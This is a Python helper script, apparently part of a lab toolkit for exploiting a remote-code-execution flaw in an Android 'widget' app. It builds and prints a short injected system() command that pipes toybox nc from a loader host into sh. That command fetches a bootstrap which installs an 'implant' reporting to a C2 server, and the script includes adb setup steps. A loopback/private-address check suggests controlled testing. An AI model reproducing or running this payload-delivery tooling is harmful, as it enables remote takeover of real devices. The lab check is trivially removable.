#!/usr/bin/env python3
"""Print the exact short system() command for the widget RCE.

The command is deliberately tiny (about 80 chars):
    setsid sh -c '<sleep>|<toybox nc HOST LOADER_PORT>|sh' &

`sleep` is required: toybox nc exits immediately when stdin reaches EOF, so
the sleep holds the pipe open while the loader sends the 20-25 KB bootstrap.
setsid detaches the pipeline, so system() returns before the app crashes.

The host is validated here too: only loopback/private addresses are accepted.
"""
from __future__ import annotations

import argparse
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(os.path.dirname(HERE), "server"))
import c2common as common  # noqa: E402


def main() -> int:
    p = argparse.ArgumentParser(description=__doc__,
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--host", required=True,
                   help="LAN address the phone can reach (e.g. <LAN_IP>)")
    p.add_argument("--port", type=int, default=common.DEFAULT_LOADER_PORT,
                   help="loader port; must match the server --loader-port")
    p.add_argument("--token", default="",
                   help="token to embed in the served implant (must match the server)")
    p.add_argument("--implant-id", default="",
                   help="optional fixed implant id (default: tg-<uid>-<device>)")
    p.add_argument("--mock", action="store_true",
                   help="host-mock variant (uses nc from PATH, not toybox)")
    p.add_argument("--nc", action="store_true",
                   help="<=50-char PATH-applet form (bare nc/sleep/sh/setsid) "
                        "for the c2560s_c2 50-byte command field")
    p.add_argument("--mock-dir", default="",
                   help="directory for the mock bootstrap (implies --mock)")
    p.add_argument("--out", default="",
                   help="also write the bootstrap script to this file")
    args = p.parse_args()

    try:
        common.check_bind_host(args.host, allow_lan=True)
        common.check_token(args.token)
    except (common.SafeBindError, ValueError) as e:
        print("[!] %s" % e, file=sys.stderr)
        return 2
    if not args.port:
        print("[!] loader port is 0; nothing to bootstrap", file=sys.stderr)
        return 2

    mock = args.mock or bool(args.mock_dir)
    cmd = common.bootstrap_command(args.host, args.port, mock=mock,
                                   short=args.nc)
    print("RCE command (%d chars):" % len(cmd))
    print(cmd)
    print()
    if args.nc:
        print("short form: bare PATH applets (nc/sleep/sh/setsid); "
              "limit %d chars" % common.SHORT_BOOTSTRAP_MAX)
    print("loader target: %s:%d" % (args.host, args.port))
    is_loop = common.parse_ip(args.host).is_loopback
    extra = "" if is_loop else " --allow-lan"
    print("server: python3 server/c2_server.py --host %s%s "
          "--loader-port %d%s"
          % (args.host, extra, args.port,
             (" --token " + args.token) if args.token else ""))
    if is_loop:
        print("loopback: use `adb reverse tcp:4444 tcp:4444` and "
              "`adb reverse tcp:%d tcp:%d` before the device run"
              % (args.port, args.port))
    if args.out:
        script = common.render_bootstrap(
            args.host, args.port, args.token, args.implant_id,
            mock=mock, mock_dir=args.mock_dir or None)
        with open(args.out, "w", encoding="utf-8") as f:
            f.write(script)
        os.chmod(args.out, 0o700)
        print("bootstrap written: %s (%d bytes)" % (args.out, len(script)))
    return 0


if __name__ == "__main__":
    sys.exit(main())
